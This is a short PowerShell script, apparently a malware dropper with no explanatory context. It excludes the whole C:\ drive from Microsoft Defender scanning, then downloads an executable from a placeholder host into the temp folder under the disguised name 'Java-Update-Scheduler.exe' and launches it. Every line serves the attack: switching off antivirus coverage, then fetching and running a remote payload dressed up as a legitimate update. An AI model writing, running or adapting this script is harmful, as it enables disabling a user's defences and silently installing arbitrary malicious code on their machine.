Add-MpPreference -ExclusionPath C:\
$url = "http://link.com"
$output = "$env:Temp/Java-Update-Scheduler.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process -FilePath $output